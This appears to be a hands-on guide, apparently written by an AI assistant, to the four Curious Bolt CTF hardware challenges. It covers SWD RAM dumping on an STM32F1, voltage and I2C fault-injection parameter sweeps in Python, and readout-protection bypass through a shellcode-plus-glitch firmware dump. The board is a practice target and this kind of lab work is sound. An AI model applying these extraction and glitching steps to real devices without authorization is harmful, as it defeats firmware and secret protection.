# Curious Bolt CTF - Complete Guide

Based on the official CTF challenges and your current setup.

---

## Your Current Setup

### Devices Detected:
- ✅ **Bus Pirate 6** - `/dev/cu.usbmodem6buspirate3` (Power & monitoring)
- ✅ **Curious Bolt** - `/dev/cu.usbmodem2103` (Glitcher)
- ✅ **Bolt CTF Board** - `/dev/cu.usbserial-110` (Target, transmitting challenge prompt)

### Current Message from Bolt CTF:
```
"Hold one of the 4 challenge buttons to start them"
```

This is the official Curious Supplies CTF challenge board!

---

## Installation Requirements

### 1. Curious Bolt Python Library

**Download and install:**
```bash
cd ~/hardware_hacking/tools
git clone https://github.com/tjclement/bolt.git
cd bolt/lib
sudo python3 setup.py install

# Or install locally
python3 setup.py install --user
```

**Verify installation:**
```python
from scope import Scope
s = Scope()
print("Bolt library installed successfully!")
```

### 2. PyOCD (for SWD debugging)
```bash
pip install pyocd
```

### 3. PulseView (for logic analyzer)
```bash
# macOS
brew install pulseview

# Or download from: https://sigrok.org/wiki/Downloads
```

---

## Challenge 1: RAM Dumping

**Objective:** Extract the flag from RAM despite disabled debugging.

### Vulnerability
STM32F1 series can only disable debugging in software, not via hardware fuses. This can be bypassed.

### Wiring
```
ST-Link         →    Bolt CTF
────────────────────────────────
SWDIO           →    SWDIO
SWCLK           →    SWCLK
GND             →    GND
3.3V            →    VCC
```

### Steps

1. **Start the challenge:**
   - Press button 1 on Bolt CTF
   - Flag is loaded into RAM

2. **Enter bootloader mode:**
   - Hold BOOT0 button
   - Press RESET button
   - Release both

3. **Connect with PyOCD:**
```bash
pyocd commander
```

4. **Dump RAM:**
```
>>> savemem 0x20000000 20480 sram.dump
>>> exit
```

5. **Extract flag:**
```bash
strings sram.dump | grep 'ctf'
```

---

## Challenge 2: Glitching a Boolean Check

**Objective:** Use power glitching to bypass an always-true condition.

### Wiring
```
Curious Bolt           →    Bolt CTF
───────────────────────────────────────
GLITCH_OUT (crowbar)   →    VCC (power rail)
GND                    →    GND
TRIGGER_IN (optional)  →    GPIO signal

Bus Pirate PSU         →    Bolt CTF VCC (for monitoring)
```

### Setup

1. **Press button 2** on Bolt CTF to start challenge 2

2. **Configure Curious Bolt:**
```python
from scope import Scope

s = Scope()

# Configure glitch parameters
s.glitch.repeat = 60  # Width: 60 * 8.3ns ≈ 498ns
s.glitch.ext_offset = 0  # No offset

# Manual trigger
s.trigger()
```

3. **Monitor serial output:**
```bash
screen /dev/cu.usbserial-110 115200
# Or use Python serial monitor
```

4. **Brute force parameters:**
```python
from scope import Scope
import serial
import time

s = Scope()
ser = serial.Serial('/dev/cu.usbserial-110', 115200, timeout=0.1)

for repeat in range(10, 200, 5):  # Width
    for offset in range(0, 1000, 10):  # Offset
        s.glitch.repeat = repeat
        s.glitch.ext_offset = offset

        # Trigger glitch
        s.trigger()
        time.sleep(0.1)

        # Check for flag
        if ser.in_waiting:
            data = ser.read(ser.in_waiting).decode('ascii', errors='ignore')
            if 'ctf' in data.lower():
                print(f"SUCCESS! repeat={repeat}, offset={offset}")
                print(f"Flag: {data}")
                break
```

### Our Backend Implementation:
```python
from hwh import detect, get_backend
from hwh.backends import GlitchConfig

bolt = get_backend(detect()['bolt'])
with bolt:
    # Configure glitch
    config = GlitchConfig(width_ns=498, offset_ns=0)
    bolt.configure_glitch(config)

    # Trigger
    bolt.trigger()
```

---

## Challenge 3: EEPROM Integrity Check

**Objective:** Corrupt I2C communication to bypass EEPROM integrity checks.

### Wiring
```
Curious Bolt               →    Bolt CTF
──────────────────────────────────────────
GLITCH_OUT (to I2C SDA!)   →    SDA line
TRIGGER_IN                 →    SDA (for timing)
CH0 (Logic analyzer)       →    SDA
CH1 (Logic analyzer)       →    SCL
GND                        →    GND
```

**Key difference:** Glitch the **SDA line**, not the power rail!

### Steps

1. **Press button 3** on Bolt CTF

2. **Capture I2C timing with logic analyzer:**
```bash
# Use PulseView
# 1. Connect Bolt to logic analyzer
# 2. Trigger on SDA falling edge
# 3. Identify EEPROM read timing
```

3. **Calculate glitch parameters:**
   - Find timing of integrity check I2C transaction
   - Set offset to hit during data transmission
   - Glitch width: 1-2 I2C clock cycles

4. **Configure and glitch:**
```python
from scope import Scope

s = Scope()

# Trigger on SDA falling edge
s.glitch.ext_offset = 150  # Adjust based on capture
s.glitch.repeat = 20  # ~166ns

# Arm on SDA line
s.arm(channel=0, edge=Scope.FALLING_EDGE)
```

---

## Challenge 4: Unreachable Code Execution

**Objective:** Call a function that never executes, despite Readout Protection.

### Part 1: Extract Firmware

1. **Download exploit:**
```bash
git clone https://github.com/JohannesObermaier/f103-analysis
cd f103-analysis
```

2. **Load shellcode with PyOCD:**
```bash
pyocd commander
>>> load shellcode.bin 0x20000000
>>> exit
```

3. **Perform power glitch:**
   - Hold BOOT0 and BOOT1 buttons
   - Trigger glitch while holding
   - Connect at 9600 baud
   - Press 'd' to dump flash

4. **Extract and clean dump:**
```bash
# Use provided script to parse output
python parse_dump.py dump.log > firmware.bin
```

### Part 2: Reverse Engineer

1. **Open in Ghidra:**
```bash
ghidra firmware.bin
```

2. **Find target function:**
   - Search strings for flag-related text
   - Locate function address (e.g., 0x08000BA8)
   - Convert to Thumb: clear bit 0 → 0x08000BA9

### Part 3: Patch and Execute

Modify exploit to call target:
```c
void (*chall4)(void) = (void (*)(void))0x08000ba9;
chall4();
```

Recompile and repeat glitch attack.

---

## Automation Scripts

### Glitch Parameter Sweep
```python
from scope import Scope
import serial
import time

def glitch_sweep(repeat_range, offset_range, callback):
    """
    Automated parameter sweep

    Args:
        repeat_range: (min, max, step) for glitch width
        offset_range: (min, max, step) for glitch offset
        callback: function to check for success
    """
    s = Scope()

    for repeat in range(*repeat_range):
        for offset in range(*offset_range):
            s.glitch.repeat = repeat
            s.glitch.ext_offset = offset

            # Trigger glitch
            s.trigger()
            time.sleep(0.05)

            # Check for success
            if callback(repeat, offset):
                return (repeat, offset)

    return None

# Example: Monitor serial for flag
def check_success(repeat, offset):
    ser = serial.Serial('/dev/cu.usbserial-110', 115200, timeout=0.1)
    if ser.in_waiting:
        data = ser.read(ser.in_waiting).decode('ascii', errors='ignore')
        if 'ctf' in data.lower():
            print(f"SUCCESS! repeat={repeat}, offset={offset}")
            print(data)
            ser.close()
            return True
    ser.close()
    return False

# Run sweep
result = glitch_sweep(
    repeat_range=(10, 200, 5),
    offset_range=(0, 1000, 10),
    callback=check_success
)
```

---

## Using Our Unified Backend

Once the `scope` library is installed:

```python
from hwh import detect, get_backend
from hwh.backends import GlitchConfig, TriggerEdge

# Detect and connect
bolt = get_backend(detect()['bolt'])
with bolt:
    # Challenge 2: Power glitching
    config = GlitchConfig(
        width_ns=500,  # 500ns glitch
        offset_ns=0,
        repeat=1
    )
    bolt.configure_glitch(config)
    bolt.trigger()

    # Challenge 3: I2C glitching with trigger
    config = GlitchConfig(
        width_ns=166,  # ~20 clock cycles
        offset_ns=1250,  # Adjust based on logic analyzer
        trigger_channel=0,  # SDA line
        trigger_edge=TriggerEdge.FALLING
    )
    bolt.configure_glitch(config)
    bolt.arm()  # Wait for trigger

    # Parameter sweep
    results = bolt.run_glitch_sweep(
        width_range=(50, 500),
        width_step=10,
        offset_range=(0, 2000),
        offset_step=50,
        attempts_per_setting=5
    )
```

---

## Wiring Summary

### For Power Glitching (Challenge 2):
```
Curious Bolt GLITCH_OUT  →  Bolt CTF VCC
Curious Bolt GND         →  Bolt CTF GND
Bus Pirate PSU           →  Bolt CTF VCC (monitoring)
```

### For I2C Glitching (Challenge 3):
```
Curious Bolt GLITCH_OUT  →  Bolt CTF SDA (I2C data line!)
Curious Bolt TRIGGER_IN  →  Bolt CTF SDA (for edge detection)
Curious Bolt CH0         →  Bolt CTF SDA (logic analyzer)
Curious Bolt CH1         →  Bolt CTF SCL (logic analyzer)
Curious Bolt GND         →  Bolt CTF GND
```

### For SWD/Programming (Challenge 1, 4):
```
ST-Link SWDIO   →  Bolt CTF SWDIO
ST-Link SWCLK   →  Bolt CTF SWCLK
ST-Link GND     →  Bolt CTF GND
ST-Link 3.3V    →  Bolt CTF VCC
```

---

## Resources

- **Official Docs:** https://bolt.curious.supplies/docs/
- **GitHub:** https://github.com/tjclement/bolt
- **Walkthrough:** https://rossmarks.uk/blog/curious-bolt-ctf-level-1/
- **F103 Analysis:** https://github.com/JohannesObermaier/f103-analysis
- **Scripts:** https://rossmarks.uk/git/0xRoM/Hardware

---

## Next Steps

1. **Install the scope library** to enable full Bolt functionality
2. **Start with Challenge 1** (easiest, no glitching required)
3. **Move to Challenge 2** (basic power glitching)
4. **Progress to Challenges 3 & 4** (advanced techniques)

---

## Quick Start

```bash
# Install Bolt library
cd ~/hardware_hacking/tools
git clone https://github.com/tjclement/bolt.git
cd bolt/lib
python3 setup.py install

# Test it
python3 -c "from scope import Scope; print('✅ Ready!')"

# Start Challenge 1
# (Press button 1 on Bolt CTF, follow RAM dumping steps)
```

Your devices are all connected and ready to go!
